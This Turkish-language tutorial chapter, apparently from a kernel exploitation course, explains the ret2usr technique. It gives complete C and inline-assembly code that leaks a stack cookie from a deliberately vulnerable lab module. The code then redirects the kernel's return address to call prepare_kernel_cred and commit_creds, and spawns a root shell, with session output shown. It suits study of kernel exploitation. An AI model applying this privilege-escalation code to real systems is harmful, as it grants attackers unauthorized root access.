# ret2usr
Root exploitimiz için popüler bir saldırı yöntemi olan `ret2usr`ı kullanıyor olacağız.

Bir önceki exploitimizde doğrudan stack'deki dönüş adresini kerneldeki bir fonksiyona 
işaret edicek şekilde ayarladık ve bu şekilde modülün akışını yönlendirmeyi başardık.

Ancak bu istediğimiz gibi kernelin akışını kontrol etmemizi sağlamıyor. İşte burda 
`ret2usr` yöntemi devreye giriyor.

Hatırlarsanız kernel'in tüm user-space belleğine erişimi var, o halde exploitimizin içinde 
olan bir fonksiyonun adresini dönüş adresi olarak ayarlıyarak kernel'in istediğimiz 
kodu çalıştırmasını sağlayabiliriz. Zaten metodun adı da burdan geliyor, `ret2usr` yani 
return-to-user, kerneli user-space'de olan bir adrese döndürüyoruz.

Hadi bunu bir örnek ile görelim:
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#define DEVICE      "/proc/vuln"

void call_cant_get_here(){
    // burda doğrudan assembly çalıştıracağız
    // unutmayın bu kod kernelde çalışcak, bu fonksiyona 
    // user-space'de olan çağrılar ekleyemeyiz
    __asm__(
    
    // normalde AT&T syntaxi olan syntaximizi 
    // daha rahat okunabilir olduğundan intel syntax'ine çekiyoruz
    ".intel_syntax noprefix;"

    // rax registerına movabs ile cant_get_here fonksiyonun adresini 
    // yüklüyoruz, movabs mov'dan farklı olarak rax'a 64 bit bir 
    // değer yüklüyor, bu da bizim 8 byte adresimiz için tam istediğimiz şey
    "movabs rax, 0xffffffff81094a50;" //cant_get_here

    // şimdi rax'a yüklediğimiz adrese atlayabiliriz
    "call rax;"

    // değiştirdiğimiz syntaxi eski haline geri döndürüyoruz 
    // bunun sebebi kodun geri kalanaın AT&T syntaxinde oluşturulucak olması
    ".att_syntax;"

    );
}

int main(){
    int fd = open(DEVICE, O_RDWR);

    unsigned long w[3];
    unsigned long r[5];
    
    read(fd, r, sizeof(r));
    for(int i = 0; i < sizeof(r)/8; i++){
        printf("Reading (%d): %lx\n", i, r[i]);
    }
    printf("Cookie leaked! %lx\n", r[4]);

    w[0] = 0; // local buffer 
    w[1] = r[4]; // stack cookie
    w[2] = (unsigned long)call_cant_get_here; // return address 

    puts("Writing payload to "DEVICE);
    write(fd, w, sizeof(w));
    close(fd);
}
```
Bu az önceki exploitimizin ret2usr metodu ile yazılmış hali. Kernel `call_cant_get_here` user-space
fonksiyonuna dönüş yapıyor, bu fonksiyonda biraz assembly kodu ile `cant_get_here` fonksiyonunu 
çağrıyoruz.

Aslında bunu assembly kullanmadan da yapabiliriz:
```c
typedef void* (*cant_get_here)(void);

void call_cant_get_here(){
    cant_get_here func = (void*)0xffffffffc00001d6;
    func();
}
```
Ancak az sonraki root exploitimiz için adresi ile çağırdımız fonksiyonlara bazı 
parametreler veriyor olacağız, ayrıca bazı registerlar ile oynayacağız ve bunu C ile yapmak inanın 
assembly ile yapmaktan çok daha karışık.

Temel `ret2usr` konseptini anladığımıza göre nasıl bir root exploiti yazabileceğimize bakalım.

Bu örnekte olduğu gibi ret2usr tekniği ile root alamanın birçok yolu var, fakat bu yolları anlamadan 
önce linux'un farklı işlemler için yetkilendirmeyi nasıl yaptığına bakmalıyız.

### Linux'da credential'lar
Linux'da her işlemin kendina ait kimlik bilgileri (credentials, kısaca credler) bulunur. Bu credler
çalışan işlemin UID'si, GID'si gibi değerli tutar. Exploitimiz çalışırken eğer biz 
exploitimizin credlerini tamamen 0'a çekebilirsek (root'un grupları, UID'leri vs. her zaman 0'dır)
o zaman exploitimizin root yetkisi kazanmasını sağlayabiliriz, ardından bir shell çalıştırıp 
root olarak sisteme erişebiliriz.

Bunu yapmanın iki yolu var, biri anlık programımızın çalıştığı işlem'in cred objesine erişip 
tek tek değerleri sıfır yapmak, ikincisi ise anlık işlem için verilen cred'leri geçen bir fonksiyon 
olan `commit_creds`i ve bizim için bir cred oluşturan `prepare_kernel_cred`i kullanmak.

`prepare_kernel_cred` eğer parametre olarak `NULL` alırsa bize tüm değerleri sıfır olan bir cred 
döndüren bir fonksiyon, öte yandan `commit_creds` kendisine parametre olarak verilen credleri anlık 
işlemin credlerine kopyalıyor, bunu kernelin kaynak kodunda da görebiliriz:

> kernel/cred.c
```c
/**
 * prepare_kernel_cred - Prepare a set of credentials for a kernel service
 * @daemon: A userspace daemon to be used as a reference
 *
 * Prepare a set of credentials for a kernel service.  This can then be used to
 * override a task's own credentials so that work can be done on behalf of that
 * task that requires a different subjective context.
 *
 * @daemon is used to provide a base cred, with the security data derived from
 * that; if this is "&init_task", they'll be set to 0, no groups, full
 * capabilities, and no keys.
 *
 * The caller may change these controls afterwards if desired.
 *
 * Returns the new credentials or NULL if out of memory.
 */
struct cred *prepare_kernel_cred(struct task_struct *daemon)
...
```
```c
/**
 * commit_creds - Install new credentials upon the current task
 * @new: The credentials to be assigned
 *
 * Install a new set of credentials to the current task, using RCU to replace
 * the old set.  Both the objective and the subjective credentials pointers are
 * updated.  This function may not be called if the subjective credentials are
 * in an overridden state.
 *
 * This function eats the caller's reference to the new credentials.
 *
 * Always returns 0 thus allowing this function to be tail-called at the end
 * of, say, sys_setgid().
 */
int commit_creds(struct cred *new)
...
```
O halde tek yapmamız gereken `commit_creds(prepare_kernel_cred(NULL))` çalıştırmak, bu bizim anlık 
işlemimize, yani exploitimize root vermek için yeterli olmalı.

Öncellikle `/proc/kallsyms`den `commit_creds` ve `prepare_kernel_cred`in adresini bulmamız lazım:
```
[root@k101 ~]# cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff81094a50 T prepare_kernel_cred
...
[root@k101 ~]# cat /proc/kallsyms | grep commit_creds
ffffffff810947b0 T commit_creds
...
```
Güzel, bu adresler aracılığı ile fonksiyonları çağırabiliriz, ancak parametreleri bu fonksiyonlara 
nasıl geçeceğiz?

Burda calling convention'ları devreye giriyor, bu arkadaşlar fonksiyon çağrılarında parametrelerin 
hangi registerlarda tutulacağını ve dönüş değerlerinin hangi reigsterlara yazılacağını belirtiyor.

Aşağıda linux `x86_64` calling convention'larının bir listesi:
![](../assets/registers.png)

Burda görebileceğiniz gibi `prepare_kernel_cred` cred'e NULL parametresini `rdi` registerı aracılığı 
ile geçeceğiz, ardından `prepare_kernel_cred`in dönüş değerini `rax`dan okuyup yine `commit_creds`e 
`rdi` aracılığı ile vereceğiz.

O halde koda geçelim:
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#define DEVICE      "/proc/vuln"

void root(void){
  __asm__(
    ".intel_syntax noprefix;"
    
    // prepare_kernel_cred'in adresini önceki gibi rax'a taşıyoruz
    "movabs rax, 0xffffffff81094a50;"
    
    // rdi register'ını 0 yani NULL olarak ayarlıyoruz
    // bu prepare_kernel_cred'in ilk parametresi
    "mov rdi, 0;"
  
    // prepare_kernel_cred'i çağrıyoruz
    "call rax;"

    // prepare_kernel_cred'in dönüş değerini rdi'a yazıyoruz
    // bu şekilde artık commit_creds'in ilk parametresi yeni 
    // cred struct objesine işaret ediyor
    "mov rdi, rax;"
  
    // rax'a commit_creds'in adresini yazıyoruz
    "movabs rax, 0xffffffff810947b0;" 

    // commit_cred'i çağrıyoruz
    "call rax;"
    
    ".att_syntax;"
  );
}

int main(){
    int fd = open(DEVICE, O_RDWR);
    unsigned long w[3];
    unsigned long r[5];

    read(fd, r, sizeof(r));
    for(int i = 0; i < sizeof(r)/8; i++){
        printf("Reading (%d): %lx\n", i, r[i]);
    }
    printf("Cookie leaked! %lx\n", r[4]);

    w[1] = r[4];
    w[2] = (unsigned long)&root;
    puts("Writing payload to "DEVICE);
    write(fd, w, sizeof(w));
    close(fd);
    return 0;
}
```
Hadi exploitimizi test etmek adına sistemde root olmayan yeni bir kullanıcı oluşturup derlediğimiz 
exploiti bu kullanıcı olarak çalıtştıralım:
```
useradd user
mkdir -p /home/user
cp exploit /home/user/exploit 
chown -R user:user /home/user
su user
```
Bu yeni kullanıcı olarak ev dizinimizde exploiti çalıştırırsak... hiçbirşey olmayacak. Exploit 
sorunsuzca çalışacak, dmesg çıktısında herhangi bir kernel hatası ile karşılaşmıyacağız ama 
root da olamayacağız. Bunun sebebi `commit_creds`in root cred'lerini sadece anlık işleme uygulaması,
bu işlem de bizim exploitimiz. Exploitimiz çalıştıktan sonra sorunsuzca root alıyor ancak bunu 
herhangi bir şekilde kullanmadan exploitimiz sonlanıyor. Exploitimizi gerçekten de kullanılabilir 
yapmak adına en son bir shell çalıştırabiliriz:
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

// en son çalıştıracağımız komut
// sh shellini çalıştırıyor olacağız
#define CMD         "/bin/sh"

#define DEVICE      "/proc/vuln"

void root(void){
  __asm__(
  ".intel_syntax noprefix;"
  "movabs rax, 0xffffffff81094a50;" //prepare_kernel_cred
  "xor rdi, rdi;"
  "call rax; mov rdi, rax;"
  "movabs rax, 0xffffffff810947b0;" //commit_creds
  "call rax;"
  ".att_syntax;"
  );
}

int main(){
  int fd = open(DEVICE, O_RDWR);
  unsigned long w[3];
  unsigned long r[5];

  read(fd, r, sizeof(r));
  for(int i = 0; i < sizeof(r)/8; i++){
    printf("Reading (%d): %lx\n", i, r[i]);
  }
  printf("Cookie leaked! %lx\n", r[4]);

  w[1] = r[4];
  w[2] = (unsigned long)&root;
  puts("Writing the payload to "DEVICE);
  write(fd, w, sizeof(w));
  close(fd);

  // bu noktada payloadımızı yazıp root aldığımıza göre 
  // komutu çalıştırabiliriz
  puts("Running the command");
  system(CMD);

  return 0;
}
```
Eğer oluşturduğumuz `user` kullanıcısı olarak bu yeni exploiti çalıştırırsak:
```
[user@k101 ~]$ ./exploit
Reading (0): 4141414141414141
Reading (1): 4141414141414141 
Reading (2): 4141414141414141 
Reading (3): 4141414141414141
Reading (4): 5e7e6aa8d2e8d600
Cookie leaked! 5e7e6aa8d2e8d600
Writing the payload to /proc/vuln
Running the command
sh-5.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-5.1#
```
root shellimizi elde ediyoruz. 

---
[Önceki](first.md) | [Başa dön](README.md)
